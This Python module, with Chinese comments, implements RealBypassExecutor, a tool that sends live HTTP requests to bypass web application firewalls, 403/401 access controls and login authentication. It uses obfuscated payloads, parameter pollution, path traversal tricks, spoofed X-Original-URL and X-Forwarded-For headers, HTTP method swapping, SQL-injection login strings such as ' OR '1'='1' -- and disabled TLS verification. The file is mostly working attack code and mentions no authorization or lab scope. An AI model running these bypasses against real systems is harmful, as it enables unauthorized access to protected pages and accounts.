"""
security/browser_automation.py - 浏览器自动化与实战执行引擎

核心能力：
- BrowserAutomation: 浏览器自动化（Playwright/Selenium/requests三级降级）
  - JS渲染页面抓取
  - 页面截图（AI可"看见"渲染结果）
  - 表单自动填写与提交
  - Cookie/会话管理
  - 等待JS加载完成
  - 元素交互（点击/输入/滚动）
- CaptchaSolver: 验证码识别（OCR/AI模型/人工介入三级）
- ManualBypassHelper: 人工手动操作绕过辅助
- RealBypassExecutor: 绕过技术实际执行引擎（真实发送请求测试）
"""
import os
import re
import sys
import json
import time
import uuid
import random
import base64
import hashlib
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from collections import defaultdict, Counter
from enum import Enum
from .models import *  # noqa: F401,F403
from .browser_automation import *  # noqa: F401,F403
from .captcha_solver import *  # noqa: F401,F403

class RealBypassExecutor:
    """绕过技术实际执行引擎

    真实发送HTTP请求测试30种绕过技术，
    不只是模拟，而是真刀真枪上战场。
    """

    def __init__(self):
        self.results: List[RealBypassResult] = []
        self.session = None

    def _get_session(self):
        """获取requests会话"""
        if self.session is None:
            import requests
            self.session = requests.Session()
            self.session.headers.update({
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Accept": "*/*",
                "Accept-Language": "zh-CN,zh;q=0.9",
            })
            self.session.verify = False
        return self.session

    def execute_waf_bypass(self, url: str, payload: str,
                            param: str = "q",
                            techniques: List[str] = None) -> List[RealBypassResult]:
        """真实执行WAF绕过测试

        Args:
            url: 目标URL
            payload: 原始Payload
            param: 参数名
            techniques: 指定测试的技术列表，None则测试全部
        """
        from .security_bypass_engine import PayloadObfuscator
        obfuscator = PayloadObfuscator()
        results = []

        # 1. 先发送原始Payload作为基线
        baseline = self._send_request(url, param, payload, "baseline", "waf")
        results.append(baseline)

        # 2. 测试10种混淆变体
        variants = obfuscator.generate_all_variants(payload)
        for variant in variants:
            if techniques and variant["technique"] not in techniques:
                continue
            result = self._send_request(url, param, variant["payload"], variant["technique"], "waf")
            results.append(result)
            # 如果找到成功的绕过，继续测试几个确认
            if result.bypass_success:
                break

        # 3. 测试8种WAF专用绕过技术
        waf_techniques = [
            ("参数污染(HPP)", f"{param}=1&{param}={payload}&{param}=3"),
            ("路径混淆", url.rstrip("/") + "/./" + url.split("/")[-1]),
            ("分块传输", "chunked"),
        ]
        for tech_name, tech_payload in waf_techniques:
            if techniques and tech_name not in techniques:
                continue
            if tech_name == "参数污染(HPP)":
                result = self._send_request(url, param, tech_payload, tech_name, "waf")
            elif tech_name == "路径混淆":
                result = self._send_request(tech_payload, param, payload, tech_name, "waf")
            else:
                result = self._send_request(url, param, payload, tech_name, "waf")
            results.append(result)

        self.results.extend(results)
        return results

    def execute_forbidden_bypass(self, url: str, target_path: str = "/admin",
                                  techniques: List[str] = None) -> List[RealBypassResult]:
        """真实执行403/401绕过测试"""
        results = []
        base_url = url.rstrip("/")

        # 6种403绕过技术
        bypass_urls = [
            ("基线", base_url + target_path),
            ("路径遍历(/..;/)", base_url + "/..;." + target_path),
            ("双斜杠(//)", base_url + "/" + target_path.lstrip("/")),
            ("URL编码(%61)", base_url + "/%61dmin"),
            ("分号(/;)", base_url + "/;" + target_path.lstrip("/")),
            ("点斜杠(/./)", base_url + "/." + target_path),
        ]

        for tech_name, test_url in bypass_urls:
            if techniques and tech_name not in techniques:
                continue
            result = self._send_request_raw(test_url, tech_name, "forbidden")
            results.append(result)

        # Header注入绕过
        header_techniques = [
            ("X-Original-URL", {"X-Original-URL": target_path}),
            ("X-Rewrite-URL", {"X-Rewrite-URL": target_path}),
            ("X-Forwarded-For", {"X-Forwarded-For": "127.0.0.1"}),
        ]
        for tech_name, headers in header_techniques:
            if techniques and tech_name not in techniques:
                continue
            result = self._send_request_with_headers(base_url + target_path, headers, tech_name, "forbidden")
            results.append(result)

        # 方法替换绕过
        method_techniques = ["POST", "PUT", "HEAD", "OPTIONS", "PATCH"]
        for method in method_techniques:
            tech_name = f"方法替换({method})"
            if techniques and tech_name not in techniques:
                continue
            result = self._send_request_method(base_url + target_path, method, tech_name, "forbidden")
            results.append(result)

        self.results.extend(results)
        return results

    def execute_auth_bypass(self, login_url: str,
                            username: str = "admin",
                            password: str = "password") -> List[RealBypassResult]:
        """真实执行认证绕过测试"""
        results = []

        # 6种认证绕过技术
        auth_payloads = [
            ("基线", username, password),
            ("SQL注入认证", "' OR '1'='1' --", password),
            ("万能密码", "admin' --", password),
            ("空密码", username, ""),
            ("用户名注入", "' OR 1=1 --", password),
            ("密码注入", username, "' OR '1'='1"),
        ]

        for tech_name, user, pwd in auth_payloads:
            result = self._send_login_request(login_url, user, pwd, tech_name)
            results.append(result)

        self.results.extend(results)
        return results

    def _send_request(self, url: str, param: str, payload: str,
                      technique_name: str, bypass_type: str) -> RealBypassResult:
        """发送GET请求测试"""
        result = RealBypassResult(
            target_url=url,
            bypass_type=bypass_type,
            technique_name=technique_name,
            payload=payload,
            method="GET",
        )

        try:
            session = self._get_session()
            test_url = f"{url}?{param}={urllib.parse.quote(payload, safe='')}"
            start_time = time.time()
            resp = session.get(test_url, timeout=15)
            result.response_time = time.time() - start_time
            result.response_status = resp.status_code
            result.response_length = len(resp.text)
            result.response_preview = resp.text[:300]

            # 判断是否被WAF拦截
            waf_indicators = ["403", "406", "blocked", "waf", "mod_security", "cloudflare", "incapsula"]
            result.blocked_by_waf = any(ind in resp.text.lower() for ind in waf_indicators) or resp.status_code in (403, 406)

            # 判断是否绕过成功（非403/406且有正常响应）
            result.bypass_success = resp.status_code == 200 and not result.blocked_by_waf

            # 判断是否确认漏洞
            vuln_indicators = ["sql", "syntax", "mysql", "oracle", "error", "warning", "root:", "uid="]
            result.vulnerability_confirmed = any(ind in resp.text.lower() for ind in vuln_indicators) and result.bypass_success

            if result.bypass_success:
                result.evidence.append(f"状态码{resp.status_code}，WAF绕过成功")
            if result.vulnerability_confirmed:
                result.evidence.append("发现漏洞特征，漏洞确认")

        except Exception as e:
            result.error = f"请求失败: {str(e)}"

        return result

    def _send_request_raw(self, url: str, technique_name: str,
                           bypass_type: str) -> RealBypassResult:
        """发送原始URL请求"""
        result = RealBypassResult(
            target_url=url, bypass_type=bypass_type,
            technique_name=technique_name, method="GET",
        )
        try:
            session = self._get_session()
            start_time = time.time()
            resp = session.get(url, timeout=15)
            result.response_time = time.time() - start_time
            result.response_status = resp.status_code
            result.response_length = len(resp.text)
            result.response_preview = resp.text[:300]
            result.bypass_success = resp.status_code == 200
            if result.bypass_success:
                result.evidence.append(f"状态码200，{technique_name}绕过成功")
        except Exception as e:
            result.error = f"请求失败: {str(e)}"
        return result

    def _send_request_with_headers(self, url: str, headers: Dict,
                                    technique_name: str,
                                    bypass_type: str) -> RealBypassResult:
        """发送带自定义Header的请求"""
        result = RealBypassResult(
            target_url=url, bypass_type=bypass_type,
            technique_name=technique_name, method="GET",
            request_headers=headers,
        )
        try:
            session = self._get_session()
            start_time = time.time()
            resp = session.get(url, headers=headers, timeout=15)
            result.response_time = time.time() - start_time
            result.response_status = resp.status_code
            result.response_length = len(resp.text)
            result.bypass_success = resp.status_code == 200
            if result.bypass_success:
                result.evidence.append(f"Header注入{technique_name}绕过成功")
        except Exception as e:
            result.error = f"请求失败: {str(e)}"
        return result

    def _send_request_method(self, url: str, method: str,
                              technique_name: str,
                              bypass_type: str) -> RealBypassResult:
        """发送指定HTTP方法的请求"""
        result = RealBypassResult(
            target_url=url, bypass_type=bypass_type,
            technique_name=technique_name, method=method,
        )
        try:
            session = self._get_session()
            start_time = time.time()
            resp = session.request(method, url, timeout=15)
            result.response_time = time.time() - start_time
            result.response_status = resp.status_code
            result.response_length = len(resp.text)
            result.bypass_success = resp.status_code == 200
            if result.bypass_success:
                result.evidence.append(f"{method}方法绕过成功")
        except Exception as e:
            result.error = f"请求失败: {str(e)}"
        return result

    def _send_login_request(self, login_url: str, username: str,
                             password: str, technique_name: str) -> RealBypassResult:
        """发送登录请求"""
        result = RealBypassResult(
            target_url=login_url, bypass_type="auth",
            technique_name=technique_name, method="POST",
            payload=f"username={username}&password={password}",
        )
        try:
            session = self._get_session()
            start_time = time.time()
            resp = session.post(
                login_url,
                data={"username": username, "password": password},
                timeout=15,
                allow_redirects=True,
            )
            result.response_time = time.time() - start_time
            result.response_status = resp.status_code
            result.response_length = len(resp.text)
            result.response_preview = resp.text[:300]

            # 判断是否登录成功
            success_indicators = ["welcome", "dashboard", "admin", "logout", "profile", "成功", "欢迎"]
            result.bypass_success = any(ind in resp.text.lower() for ind in success_indicators) and resp.status_code == 200
            if result.bypass_success:
                result.evidence.append(f"{technique_name}认证绕过成功")

        except Exception as e:
            result.error = f"请求失败: {str(e)}"
        return result

    def get_successful_bypasses(self) -> List[RealBypassResult]:
        """获取所有成功的绕过"""
        return [r for r in self.results if r.bypass_success]

    def get_statistics(self) -> Dict:
        """获取执行统计"""
        by_type = defaultdict(lambda: {"total": 0, "success": 0, "vuln_confirmed": 0})
        for r in self.results:
            by_type[r.bypass_type]["total"] += 1
            if r.bypass_success:
                by_type[r.bypass_type]["success"] += 1
            if r.vulnerability_confirmed:
                by_type[r.bypass_type]["vuln_confirmed"] += 1

        return {
            "total_tests": len(self.results),
            "successful_bypasses": sum(1 for r in self.results if r.bypass_success),
            "confirmed_vulnerabilities": sum(1 for r in self.results if r.vulnerability_confirmed),
            "blocked_by_waf": sum(1 for r in self.results if r.blocked_by_waf),
            "by_type": {k: {**v, "success_rate": round(v["success"]/v["total"]*100, 1) if v["total"] > 0 else 0}
                        for k, v in by_type.items()},
        }
